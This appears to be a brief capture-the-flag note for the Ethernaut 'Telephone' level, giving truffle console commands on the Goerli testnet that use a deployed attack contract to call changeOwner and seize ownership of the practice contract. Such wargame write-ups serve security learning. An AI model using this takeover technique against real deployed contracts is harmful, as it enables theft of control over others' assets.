# Telephone

[Telephone](https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe)

<BR />

## Live Attack
```BASH
truffle console --network goerli
```

```JS
//Identify the account index
// 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
accounts
sender = accounts[5]

telephone = await Telephone.at('0x345E615311dee8FF11889FF57ED615Db3905f776')
telephone.owner()
telephone.address

attack = await TelephoneAttack.deployed()
attack.target()
await attack.changeOwner({from: sender})

telephone.owner()
```